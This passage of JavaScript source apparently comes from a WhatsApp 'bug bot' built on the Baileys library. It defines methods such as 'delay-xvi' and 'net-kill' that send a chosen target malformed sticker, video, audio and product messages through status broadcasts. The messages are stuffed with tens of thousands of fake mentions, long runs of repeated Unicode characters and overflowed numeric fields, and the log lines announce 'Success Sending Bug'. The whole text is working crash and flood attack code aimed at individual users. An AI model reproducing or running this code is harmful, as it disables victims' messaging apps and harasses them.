                                mediaKey: "0VCukzmEk/wwWvGy9lbFuy0njbNt7kYJSBLs3vGntAs=",
                                fileEncSha256: "0Q/bOEU/qYaLTdHVjHjduWEv/O158biR9t+XjFxdMy8=",
                                directPath: "/o1/v/t62.7118-24/f2/m232/AQNKlCph1zdbAtdwzV9qkGpH5FFz-T04AOgg4dYv-Im1uX970yxdEBJGeP4ZayAq3Rzi6m-IjDkXDE5FHb32KnwlVyE3K1ggOBP0Odf8Jg?ccb=9-4&oh=01_Q5AaIKoA8rDjXnQ9RYWAFrsKFxCt9X-8dfhJNOXBos-WRTMQ&oe=67CCB7EF&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880428, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            }
        ];

        for (const msg of messages) {
            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
    },

    /**
     * delay-xvi method
     * Created by XProtexGlow
     */
    "delay-xvi": async (sock, target, mention) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mdelay-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        let parse = true;
        let SID = "5e03e0&mms3";
        let key = "10000000_2012297619515179_5714769099548640934_n.enc";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const mentionedList = [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 40000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
        ];

        const message = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                        fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                        fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                        mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                        mimetype: type,
                        directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({
                                    length: 1000 * 40,
                                },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        };

        const msg = await generateWAMessageFromContent(target, message, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });

        const embeddedMusic = {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            author: ".DRGN || VaxzyAnonymous" + "ោ៝".repeat(10000),
            title: "XProtexGlow",
            artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
            artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
            artistAttribution: "https://www.instagram.com/_u/xrelly",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
        };

        const videoMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
            fileLength: "1515940",
            seconds: 14,
            mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
            height: 1280,
            width: 720,
            fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
            directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1748276788",
            contextInfo: { isSampled: true, mentionedJid: mentionedList },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
                newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬"
            },
            streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
            thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
            thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
            thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",
            annotations: [{
                embeddedContent: { embeddedMusic },
                embeddedAction: true
            }]
        };

        const stickerMessage = {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: "image/webp",
                directPath: "/v/t62.7116-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: { low: 1, high: 0, unsigned: true },
                mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                isAvatar: false,
                isAiSticker: false,
                isLottie: false,
                contextInfo: {
                    mentionedJid: mentionedList
                }
            }
        };

        const audioMessage = {
            audioMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
                mimetype: "audio/mpeg",
                fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
                fileLength: "389948",
                seconds: 24,
                ptt: false,
                mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
                caption: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
                fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
            }
        };

        const msg1 = await generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { videoMessage } }
        }, {});

        const msg2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: { message: stickerMessage }
        }, {});

        const msg3 = await generateWAMessageFromContent(target, audioMessage, {});

        // Relay all messages
        for (const msg of [msg1, msg2, msg3]) {
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }]
                }]
            });
        }

        if (mention) {
            await sock.relayMessage(target, {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg1.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }]
            });
        }
    },

    /**
     * net-kill method
     * Created by XProtexGlow
     */
    "net-kill": async (sock, target, mention) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mnet-kill\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        const floods = 40000;
        const mentioning = "13135550002@s.whatsapp.net";
        const mentionedJids = [
            mentioning,
            ...Array.from({ length: floods }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
        ];

        const videoMessage = {
            interactiveAnnotations: [],
            annotations: [
                {
                    embeddedContent: {
                        musicContentMediaId: "589608164114571",
                        songId: "870166291800508",
                        author: "WTF!" + "ោ៝".repeat(1000),
                        title: "WTF!",
                        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                        artistAttribution: "https://www.instagram.com/_u/WTF!",
                        countryBlocklist: true,
                        isExplicit: true,
                        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                    },
                    embeddedAction: true,
                },
            ],
            caption: `XProtex Here Bro!!` + `ោ៝`.repeat(2000),
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "bvkPnStTimcqgvugKm2jV1cKSAdJ00DnnKR31N/aH0Q=",
            fileLength: {
                low: 55438054,
                high: 0,
                unsigned: true,
            },
            seconds: 312,
            mediaKey: "XSc3T7jk+OhrNGSH4gMZQFnzL7boede9orqrG4a+QZ0=",
            height: 864,
            width: 480,
            fileEncSha256: "krpFGEDnkho/kNIQRY6qCYfzxdaxNzdW2H5fli3qg64=",
            directPath: "/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0",
            mediaKeyTimestamp: {
                low: 1745804782,
                high: 0,
                unsigned: false,
            },
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                        {
                            length: 42000,
                        },
                        () =>
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                ],
                groupMentions: [],
            },
            streamingSidecar: "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",
        };

        const msg1 = await generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});

        await sock.relayMessage("status@broadcast", msg1.message, {
            messageId: msg1.key.id,
            statusJidList: [target],
        });

        const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
        const mime = "audio/mpeg";
        const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
        const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
        const audio_st_key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE="; // Renamed from st_key
        const timestamp = 99999999999999;
        const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
        const longs = 99999999999999;
        const loaded = 99999999999999;
        const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

        const messageContext = {
            mentionedJid: mentionedJids,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
                newsletterName: "XPROTEX"
            }
        };

        const messageContent = {
            ephemeralMessage: {
                message: {
                    audioMessage: {
                        url: links,
                        mimetype: mime,
                        fileSha256: sha,
                        fileLength: longs,
                        seconds: loaded,
                        ptt: true,
                        mediaKey: audio_st_key,
                        fileEncSha256: enc,
                        directPath: path,
                        mediaKeyTimestamp: timestamp,
                        contextInfo: messageContext,
                        waveform: data
                    }
                }
            }
        };

        const msg2 = await generateWAMessageFromContent(target, messageContent, { userJid: target });

        const broadcastSend = {
            messageId: msg2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        };

        await sock.relayMessage("status@broadcast", msg2.message, broadcastSend);

        if (mention) {
            await sock.relayMessage(target, {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg2.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [{
                    tag: "meta",
                    attrs: {
                        is_status_mention: " null - exexute "
                    },
                    content: undefined
                }]
            });
        }
    }
};
